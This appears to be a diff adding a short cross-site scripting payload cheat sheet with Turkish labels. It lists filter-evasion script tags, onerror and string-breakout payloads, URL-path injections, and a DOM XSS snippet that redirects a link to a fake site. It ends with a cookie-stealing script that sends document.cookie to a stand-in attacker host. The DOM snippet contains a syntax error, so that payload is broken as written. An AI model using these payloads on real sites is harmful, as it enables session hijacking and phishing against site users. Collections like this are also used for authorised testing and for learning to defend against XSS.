@@ -1,1 +1,25 @@
 
+<script>
+<Script></ScRipt>
+<scr<script>ipt>alert('1');</scr<script>ipt>
+<h1>m</h1> // <img src="none" onerror="alert('1')"/>
+<img src="none" prompt="alert('1')"/>
+
+JAVASCRIPT CODE :
+"; alert('1'); // : çift tırnak
+'; alert('1'); // : tek tırnak
+
+
+
+URL PATH : 
+/"><script>alert('1');</script> :  
+/''><script>alert('1');</script>  : 
+
+
+DOM XSS:
+?data=şlsög#<script>alert(1);</script>
+<script>window.onload = function () {var link=document.getElementById.("link"); link.href="https://sahtesi.com";}</script>
+
+
+COOKİE STEAL:
+<script>document.location.href="http://atackermachine/logkaydet.php?cookie="+document.cookie</script>
